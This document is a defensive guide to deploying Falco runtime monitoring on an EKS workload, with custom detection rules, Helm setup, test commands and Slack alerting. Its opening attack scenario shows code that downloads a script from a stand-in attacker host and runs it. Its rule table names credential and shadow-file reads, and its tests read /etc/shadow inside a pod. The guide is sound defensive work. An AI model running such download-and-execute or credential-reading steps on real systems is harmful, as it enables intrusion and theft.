# Falco Runtime Security Guide

Real-time syscall monitoring and attack detection for SmartScale AI KEDA EKS workloads.

---

## 1. Why Runtime Security?

The security stack for SmartScale AI has three layers:

| Layer | Tool | When | What it catches |
|---|---|---|---|
| **Build time** | Trivy | CI pipeline | Known CVEs in OS + pip packages |
| **Deploy time** | OPA Gatekeeper | kubectl apply | Misconfigured manifests |
| **Runtime** | Falco | Continuously | Actual attacks inside running containers |

**The gap that only runtime security fills:**

```
Attack scenario: compromised Python dependency

Step 1: Attacker publishes malicious version of 'requests' to PyPI.
Step 2: Dev pins requests==2.31.0 in requirements.txt.
Step 3: Trivy: no CVE yet (0-day). OPA: manifest valid. Container deploys.
Step 4: At runtime: malicious code runs:
          import subprocess
          subprocess.run(["curl", "http://c2.attacker.com/shell.sh", "-o", "/tmp/s.sh"])
          subprocess.run(["bash", "/tmp/s.sh"])
Step 5: FALCO FIRES: "Shell spawned in SmartScale container" (CRITICAL)
         AND: "Unexpected outbound connection from SmartScale" (ERROR)
Step 6: Alert reaches Slack in < 1 second. Incident response begins.
```

---

## 2. How Falco Works

```
┌──────────────────────────────────────────────────────────┐
│                    EKS Worker Node                        │
│                                                           │
│  ┌─────────────────────┐    ┌─────────────────────────┐  │
│  │  keda-demo Pod      │    │  Falco Pod (DaemonSet)  │  │
│  │  app.py process     │    │  - Loads eBPF probe      │  │
│  │  making syscalls    │───▶│  - Intercepts syscalls   │  │
│  └─────────────────────┘    │  - Matches Rego rules    │  │
│                              │  - Emits JSON alerts     │  │
│                              └──────────┬──────────────┘  │
└─────────────────────────────────────────┼─────────────────┘
                                          │ JSON to stdout
                                          ▼
                               Fluent Bit (Day 33)
                                          │
                               ┌──────────┴───────────┐
                               ▼                       ▼
                           CloudWatch             Slack/PagerDuty
                           Logs                   (via falcosidekick)
```

**System call interception (eBPF mode):**
- A small eBPF program is loaded into the Linux kernel.
- Every syscall (`open`, `connect`, `execve`, `fork`, etc.) passes through the probe.
- The probe copies syscall metadata to a ring buffer.
- Falco's userspace process reads the ring buffer and evaluates rules.
- Zero kernel modifications. No kernel module. Works on Amazon Linux 2.

---

## 3. SmartScale AI Custom Rules

All rules live in [`monitoring/falco-rules.yaml`](../monitoring/falco-rules.yaml).

| Rule | Priority | Trigger | MITRE |
|---|---|---|---|
| Shell Spawned | `CRITICAL` | `/bin/sh`, `/bin/bash` process created | T1059 Command Execution |
| Unexpected Outbound | `ERROR` | Connection to non-SQS/non-STS destination | T1041 Exfiltration |
| AWS Credential Read | `CRITICAL` | `open(~/.aws/credentials)` | T1552 Credential Access |
| Write to /etc | `ERROR` | `write(/etc/passwd)` etc. | T1543 Persistence |
| Sensitive File Read | `WARNING` | `open(/etc/shadow)`, `/proc/1/environ` | T1082 Discovery |
| Root Process | `WARNING` | Process spawned as UID 0 | T1068 Privilege Escalation |
| kubectl exec | `NOTICE` | Pseudo-terminal attached (tty != 0) | Audit trail |

### Reading a Falco Alert (JSON format)

```json
{
  "time": "2026-09-30T15:30:00.000000000Z",
  "rule": "Shell Spawned in SmartScale Container",
  "priority": "Critical",
  "output": "Shell spawned in SmartScale container (user=root container=keda-demo-xxx pod=keda-demo-xxx-yyy image=keda-demo-app proc=bash parent=python cmdline=bash -i)",
  "output_fields": {
    "container.name": "keda-demo",
    "k8s.pod.name": "keda-demo-xxx-yyy",
    "proc.name": "bash",
    "proc.pname": "python",
    "user.name": "root"
  },
  "tags": ["smartscale", "shell", "container_escape", "mitre_execution"]
}
```

**Parsing alerts from logs:**
```bash
# Stream all CRITICAL Falco alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco -f \
  | jq 'select(.priority == "Critical")'

# Filter only SmartScale alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco -f \
  | jq 'select(.tags | contains(["smartscale"]))'
```

---

## 4. Deploying Falco

### Option A: Raw Manifests (Demo)

```bash
# Apply RBAC, ConfigMaps, DaemonSet
kubectl apply -f monitoring/falco-rules.yaml
kubectl apply -f monitoring/falco-deployment.yaml

# Verify all pods are Running (one per node)
kubectl get pods -n falco -o wide
# NAME          READY  STATUS   NODE
# falco-xxxxx   1/1    Running  ip-10-0-1-100
# falco-yyyyy   1/1    Running  ip-10-0-1-101

# Watch live alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco -f | jq .
```

### Option B: Helm (Production)

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=ebpf \
  --set-file customRules."smartscale-rules\.yaml"=monitoring/falco-custom-rules.yaml \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="$SLACK_WEBHOOK_URL" \
  --set falcosidekick.config.slack.minimumpriority="warning"
```

---

## 5. Testing Rules

### Trigger the Shell Rule (CRITICAL)

```bash
# This will trigger: "Shell Spawned in SmartScale Container"
kubectl exec -it -n keda-demo \
  $(kubectl get pod -n keda-demo -l app=keda-demo -o name | head -1) \
  -- /bin/bash

# Expected Falco output (within 1 second):
# {"rule": "Shell Spawned in SmartScale Container", "priority": "Critical", ...}
```

### Trigger the Sensitive File Rule (WARNING)

```bash
kubectl exec -n keda-demo \
  $(kubectl get pod -n keda-demo -l app=keda-demo -o name | head -1) \
  -- cat /etc/shadow 2>/dev/null || true

# Expected: "Sensitive File Read in SmartScale Container" (WARNING)
```

### Verify No False Positives (Normal Operation)

```bash
# Normal SQS polling should produce zero Falco alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=5m \
  | jq 'select(.tags | contains(["smartscale"]))' \
  | wc -l
# Expected: 0 (no alerts during normal operation)
```

---

## 6. Slack Alert Integration (falcosidekick)

`falcosidekick` is a sidecar that reads Falco gRPC output and forwards
alerts to 60+ destinations (Slack, PagerDuty, CloudWatch, Elasticsearch).

```yaml
# values for Helm install
falcosidekick:
  enabled: true
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/T.../B.../..."
      minimumpriority: "warning"  # Only send WARNING and above
      channel: "#security-alerts"
      icon: ":falco:"
    pagerduty:
      routingKey: "<your-integration-key>"
      minimumpriority: "critical"   # PagerDuty only for CRITICAL
```

**Slack alert appearance:**
```
🦅 Falco Alert — CRITICAL
Rule: Shell Spawned in SmartScale Container
Pod: keda-demo-xxx-yyy (namespace: keda-demo)
Container: keda-demo-app
Process: bash (parent: python3)
Time: 2026-09-30 15:30:00 UTC
```

---

## 7. Writing Custom Falco Rules

```yaml
- rule: My Custom Rule
  desc: What this rule detects
  condition: >
    spawned_process          # A new process was created
    and container            # It's in a container (not host)
    and container.name startswith "my-app"
    and proc.name = "wget"   # wget should never run in my app
  output: >
    wget executed in my-app container
    (pod=%k8s.pod.name proc=%proc.name cmdline=%proc.cmdline)
  priority: ERROR
  tags: [myapp, network]
```

**Useful Falco filter fields:**

| Field | Description |
|---|---|
| `container.name` | Docker container name |
| `k8s.pod.name` | Kubernetes pod name |
| `proc.name` | Process executable name |
| `proc.cmdline` | Full command line |
| `proc.pname` | Parent process name |
| `user.uid` | User ID (0 = root) |
| `fd.name` | File path being accessed |
| `fd.rip` | Remote IP for network connections |
| `fd.rport` | Remote port |
| `evt.type` | Syscall type (execve, open, connect, etc.) |

---

## 8. Security Layer Comparison

| Scenario | Trivy | OPA | Falco |
|---|---|---|---|
| Vulnerable pip package | ✅ Catches | ❌ | ❌ |
| Pod missing resource limits | ❌ | ✅ Blocks | ❌ |
| Shell spawned at runtime | ❌ | ❌ | ✅ Alerts |
| /etc/shadow read at runtime | ❌ | ❌ | ✅ Alerts |
| Data exfiltration over network | ❌ | ❌ | ✅ Alerts |
| kubectl exec (audit) | ❌ | ❌ | ✅ Logs |

**Conclusion:** All three tools are necessary. They catch fundamentally different
attack vectors at different points in the lifecycle.
